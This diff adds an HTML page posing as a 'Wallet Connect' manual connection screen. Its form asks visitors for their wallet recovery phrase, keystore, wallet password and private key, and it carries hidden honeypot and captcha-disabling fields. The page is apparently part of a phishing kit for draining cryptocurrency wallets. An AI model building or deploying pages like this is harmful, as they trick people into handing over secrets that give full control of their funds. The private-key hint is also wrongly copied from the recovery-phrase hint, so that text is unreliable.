@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="stylesheet" href="connect.css">
+    <title>Connect Manually</title>
+  </head>
+  <body>
+    <div class="formsec main">
+      <div class="show">
+        <img src="images/coins/wallet connect.png" alt="" />
+        <p>Wallet Connect</p>
+      </div>
+      <form action="">
+        <div class="field">
+          <input type="text" name="_honey" style="display: none;">
+          <input type="hidden" name="_captcha" value="false">
+            <label for="phrase">Phrase:</label>
+            <input type="text" placeholder="enter your recovery phrase" id="phrase">
+            <span class="info">Typically 12 (sometimes 24) words seperated by single spaces</span>
+        </div>
+
+        <div class="field">
+            <label for="keystore">Keystore:</label>
+            <input type="text" placeholder="Enter keystore">
+
+            <label for="password">Wallet Password:</label>
+            <input type="password" placeholder="wallet password">
+            <span class="info">several lines of texts begining with {...} plus password used to encrypt it</span>
+        </div>
+
+        <div class="field">
+            <label for="private">Private Key:</label>
+            <input type="text" placeholder="enter private key">
+            <span class="info">Typically 12 (sometimes 24) words seperated by a single space</span>
+        </div>
+        <div class="submit"><button type="submit">Proceed</button>
+        
+            <div class="cancel">Cancel</div>
+        </div>
+
+
+      </form>
+    </div>
+  </body>
+</html>
